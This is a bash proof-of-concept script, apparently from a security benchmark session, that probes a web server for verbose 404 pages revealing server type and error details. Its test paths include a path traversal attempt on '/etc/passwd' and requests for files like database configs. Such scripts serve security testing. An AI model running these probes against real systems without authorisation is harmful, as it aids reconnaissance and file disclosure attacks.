#!/bin/bash
# POC: Demonstrates verbose 404 error messages that leak application path information and server details
# Target: ./repo
# Created: 2025-11-06T19:41:50.260Z
# Session: benchmark-XBEN-026-24-mhntpx9y

# Verbose 404 Error Message Information Disclosure POC
# This script demonstrates how verbose 404 error pages leak information
# about the application structure and server type.

TARGET_URL="${1:-http://localhost:8080}"
TEST_PATHS=(
    "/nonexistent.html"
    "/admin/secret.txt"
    "/config/database.conf"
    "/api/v1/users/999"
    "/../../../etc/passwd"
)

echo "=========================================="
echo "Verbose 404 Error Message POC"
echo "=========================================="
echo "Target: $TARGET_URL"
echo ""

for path in "${TEST_PATHS[@]}"; do
    echo "Testing path: $path"
    echo "---"
    
    # Make request and capture response
    response=$(curl -s -w "\n%{http_code}" "$TARGET_URL$path" 2>&1)
    
    # Extract HTTP status code (last line)
    http_code=$(echo "$response" | tail -n1)
    
    # Extract response body (all lines except last)
    body=$(echo "$response" | head -n-1)
    
    echo "HTTP Status: $http_code"
    
    # Check if we got a 404
    if [ "$http_code" = "404" ]; then
        echo "✓ Verbose 404 Response Detected"
        echo ""
        echo "Response snippet:"
        
        # Extract and display key information from the error
        if echo "$body" | grep -q "File not found"; then
            echo "  - Contains: 'File not found' message"
        fi
        
        if echo "$body" | grep -q "Nothing matches the given URI"; then
            echo "  - Contains: 'Nothing matches the given URI'"
        fi
        
        if echo "$body" | grep -q "Error code: 404"; then
            echo "  - Contains: Error code information"
        fi
        
        if echo "$body" | grep -q "SimpleHTTP"; then
            echo "  - Contains: Server type disclosure (SimpleHTTP)"
        fi
        
        # Count HTML tags to verify HTML response
        tag_count=$(echo "$body" | grep -o '<[^>]*>' | wc -l)
        if [ "$tag_count" -gt 0 ]; then
            echo "  - Returns: Structured HTML error page ($tag_count HTML tags)"
        fi
        
        echo ""
        echo "Full response:"
        echo "$body" | head -c 500
        if [ ${#body} -gt 500 ]; then
            echo "... (truncated)"
        fi
        
    else
        echo "✗ Unexpected HTTP status: $http_code"
    fi
    
    echo ""
    echo "=========================================="
    echo ""
done

echo "POC Summary:"
echo "- Verbose 404 messages reveal server type (SimpleHTTP)"
echo "- Error responses contain detailed path information"
echo "- Consistent error format allows fingerprinting"
echo "- Information useful for directory enumeration attacks"